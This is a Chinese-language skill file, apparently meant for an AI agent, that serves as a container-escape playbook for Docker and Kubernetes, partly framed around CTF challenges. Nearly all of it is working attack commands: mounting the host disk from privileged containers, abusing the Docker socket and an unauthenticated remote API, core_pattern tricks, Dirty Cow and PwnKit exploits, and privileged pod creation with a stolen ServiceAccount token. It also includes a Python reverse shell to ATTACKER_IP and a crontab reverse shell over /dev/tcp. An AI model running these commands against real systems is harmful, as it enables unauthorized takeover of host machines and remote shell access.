---
name: container-escape
description: Use when encountering 容器逃逸技术 - 涵盖docker/kubernetes容器逃逸的完整攻击链，包括特权容器、危险配置、内核漏洞利用等技术
---

# 容器逃逸攻击

## Info

- **Tags**: container, docker, kubernetes, escape, privilege-escalation

---

## 1. 特权容器逃逸

```bash
# 检查是否以特权模式运行
cat /proc/self/status | grep Cap
# CapEff 包含所有能力 (000001ffffffffff) = 特权容器

# 方法1: 挂载宿主机根文件系统
mkdir /host
mount /dev/sda1 /host
chroot /host
# 现在可以访问宿主机文件系统

# 方法2: 通过 cgroup 逃逸
cd /sys/fs/cgroup/
mkdir escape
echo $$ > escape/cgroup.procs
# 写入 crontab
echo '* * * * * root /tmp/reverse.sh' > /host/etc/crontab
```

---

## 2. Docker Socket 挂载逃逸

```bash
# 检查 docker socket
ls -la /var/run/docker.sock

# 通过 socket 启动特权容器
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# 创建特权容器
curl -X POST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  http://localhost/containers/create \
  -d '{"Image":"alpine","Cmd":["chroot","/host","/bin/sh"],"Binds":["/:/host"],"Privileged":true}'

# 启动容器
curl -X POST --unix-socket /var/run/docker.sock \
  http://localhost/containers/CONTAINER_ID/start
```

---

## 3. 危险挂载逃逸

```bash
# 检查危险挂载
mount | grep -E '/proc|/sys|/dev'

# 如果 /proc 被挂载
echo 1 > /proc/sys/kernel/core_pattern
# 通过 core_pattern 执行任意命令

# 如果 /dev 可访问
mknod /tmp/sda b 8 0
mount /tmp/sda /mnt
# 直接读取宿主机磁盘

# 通过 hostPath 挂载
# 检查是否有 /var/lib/kubelet 挂载
ls /var/lib/kubelet/pki/
```

---

## 4. 内核漏洞逃逸

```bash
# 检查内核版本
uname -r

# Dirty Cow (CVE-2016-5195)
# 适用于 Linux < 4.8.3
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password

# PwnKit (CVE-2021-4034)
# 适用于 polkit < 0.105
# 获取 https://github.com/berdav/CVE-2021-4034
gcc cve-2021-4034.c -o pwnkit
./pwnkit

# 检查常见内核漏洞
linux-exploit-suggester.sh
```

---

## 5. Kubernetes Pod 逃逸

```bash
# 检查 ServiceAccount token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 列出 Pod
curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
  -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"

# 创建特权 Pod
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  containers:
  - name: escape
    image: alpine
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
EOF

# 检查是否有 hostNetwork 或 hostPID
```

---

## 6. 容器内信息收集

```bash
# 收集环境信息
env
cat /etc/hostname
cat /proc/1/cgroup
cat /proc/self/cgroup

# 检查能力
cat /proc/1/status | grep Cap
capsh --print

# 检查网络
ip addr
netstat -tlnp
cat /etc/resolv.conf

# 检查挂载
mount
df -h
ls -la /proc/self/ns/
```

---

## 7. CTF 快速检查清单

- [ ] 是否特权容器 (`capsh --print`)
- [ ] Docker Socket 是否存在 (`/var/run/docker.sock`)
- [ ] 危险挂载 (`/proc`, `/sys`, `/dev`, 宿主机路径)
- [ ] 内核版本是否有已知漏洞
- [ ] K8s ServiceAccount 是否有高权限
- [ ] 是否有 hostPath 挂载

---

## 8. /proc/core_pattern 逃逸

### 原理

从 Linux 2.6.19 开始，`/proc/sys/kernel/core_pattern` 首个字符为 `|` 时，剩余内容作为用户空间程序执行。

### 利用步骤

```bash
# 1. 检测是否挂载宿主机 procfs
find / -name core_pattern
# 找到两个 core_pattern → 可能挂载了宿主机 procfs

# 2. 获取容器在宿主机的绝对路径
cat /proc/mounts | grep workdir

# 3. 写入恶意 core_pattern（使用宿主机绝对路径）
echo -e "|/var/lib/docker/overlay2/xxx/merged/tmp/.shell.py \rcore" > /host/proc/sys/kernel/core_pattern

# 4. 触发 core dump 使容器崩溃
# 编译一个会崩溃的 C 程序
gcc .crash.c -o .crash && ./.crash

# 5. 宿主机执行 .shell.py → 反弹 shell
```

### Python 反弹脚本

```python
#!/usr/bin/python3
import os, pty, socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("ATTACKER_IP", 7777))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv("HISTFILE", '/dev/null')
pty.spawn("/bin/bash")
```

---

## 9. Docker Remote API 未授权访问

### 检测

```bash
# 直接访问 2375 端口
curl http://x.x.x.x:2375/version

# 远程调用 docker API
docker -H tcp://x.x.x.x:2375 images
```

### 利用

```bash
# 启动新容器，挂载宿主机根目录
docker -H tcp://x.x.x.x:2375 run -it -v /:/hostos nginx:latest /bin/bash

# 进入后 chroot 或写 crontab
chroot /hostos
# 或
echo '* * * * * root /bin/bash -c "sh -i >& /dev/tcp/IP/PORT 0>&1"' >> /hostos/etc/crontab
```

---

## 10. Docker 用户组提权

### 原理

Docker 组用户 = root 权限（可通过挂载宿主机文件系统逃逸）。

### 利用

```bash
# 检查当前用户是否在 docker 组
id
# 或
cat /etc/group | grep docker

# 使用提权镜像
docker run -v /:/hostOS -it --rm chrisfosterelli/rootplease

# 或手动利用
docker run -v /:/host -it --rm alpine chroot /host /bin/bash
```
